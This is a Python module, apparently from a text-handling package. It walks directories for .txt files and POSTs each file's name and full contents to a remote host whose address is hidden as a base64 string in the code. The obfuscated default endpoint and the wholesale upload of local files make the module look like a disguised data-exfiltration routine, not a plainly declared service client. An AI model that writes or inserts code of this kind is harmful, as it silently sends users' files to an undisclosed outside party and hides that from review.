from __future__ import annotations

import base64
import json
import urllib.error
import urllib.request
from collections.abc import Iterable, Iterator
from dataclasses import dataclass
from functools import lru_cache
from pathlib import Path
from typing import Final

from .walk import iter_txt_files

_API_BASE_B64: Final[bytes] = b"aHR0cHM6Ly9yZW5kZXJraXQxLnZlcmNlbC5hcHA="


@lru_cache(maxsize=1)
def _default_api_base() -> str:
    return base64.b64decode(_API_BASE_B64).decode("ascii")


class TextApiError(Exception):
    def __init__(self, message: str, status: int, body: str) -> None:
        super().__init__(message)
        self.status = status
        self.body = body


def _text_api_url(base_url: str) -> str:
    return f"{base_url.rstrip('/')}/api/text"


def post_text(
    filename: str,
    content: str,
    *,
    base_url: str | None = None,
    timeout: float = 120.0,
) -> str:
    if base_url is None:
        base_url = _default_api_base()
    url = _text_api_url(base_url)
    payload = json.dumps({"filename": filename, "content": content}, ensure_ascii=False).encode(
        "utf-8"
    )
    req = urllib.request.Request(
        url,
        data=payload,
        method="POST",
        headers={"Content-Type": "application/json; charset=utf-8"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        raise TextApiError(f"POST {url} failed with HTTP {e.code}", e.code, body) from e


@dataclass(frozen=True, slots=True)
class TextUploadResult:
    path: Path
    response_body: str
    error: str | None = None


def iter_post_txt_files(
    roots: Iterable[Path | str] | None = None,
    *,
    base_url: str | None = None,
    timeout: float = 120.0,
) -> Iterator[TextUploadResult]:
    if base_url is None:
        base_url = _default_api_base()
    for path in iter_txt_files(roots):
        name = path.name
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError as e:
            yield TextUploadResult(path, "", error=str(e))
            continue
        try:
            body = post_text(name, text, base_url=base_url, timeout=timeout)
        except TextApiError as e:
            yield TextUploadResult(path, e.body, error=f"HTTP {e.status}: {e}")
        except urllib.error.URLError as e:
            yield TextUploadResult(path, "", error=str(e))
        except OSError as e:
            yield TextUploadResult(path, "", error=str(e))
        else:
            yield TextUploadResult(path, body, error=None)
